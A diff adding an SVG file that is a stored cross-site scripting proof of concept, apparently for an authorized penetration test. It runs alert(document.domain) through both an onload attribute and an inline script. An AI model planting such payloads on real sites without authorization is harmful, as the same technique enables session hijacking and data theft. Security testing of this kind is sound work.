@@ -1,0 +1,6 @@
+<?xml version="1.0" standalone="no"?>
+<!-- Stored XSS PoC (guide §13). ONLY valid if served inline (image/svg+xml) from the APP ORIGIN.
+     Authorized testing only. alert(document.domain) proves the origin. Delete after PoC. -->
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" onload="alert(document.domain)">
+  <script>alert(document.domain)</script>
+</svg>
